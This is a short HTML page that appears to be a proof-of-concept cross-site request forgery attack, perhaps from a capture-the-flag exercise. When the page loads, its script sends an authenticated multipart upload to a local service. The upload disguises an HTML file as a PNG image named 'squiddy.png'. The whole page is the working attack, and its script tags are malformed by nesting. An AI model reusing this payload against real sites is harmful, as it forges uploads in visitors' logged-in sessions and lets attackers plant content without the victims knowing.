<!DOCTYPE html>
<html>
  <body>
    <script>
      <script>
      (async () => {
        const boundary = "----WebKitFormBoundaryEhgmeB1GsaBlvxKz";
        const body = 
          `------${boundary}\r\n` +
          `Content-Disposition: form-data; name="file"; filename="squiddy.png"\r\n` +
          `Content-Type: text/html\r\n\r\n` +
          `stuff\r\n` +
          `------${boundary}--`;
      
        await fetch("http://localhost:1337/upload", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "multipart/form-data; boundary=" + boundary
          },
          body
        });
      })();
      </script>

    </script>
  </body>
</html>
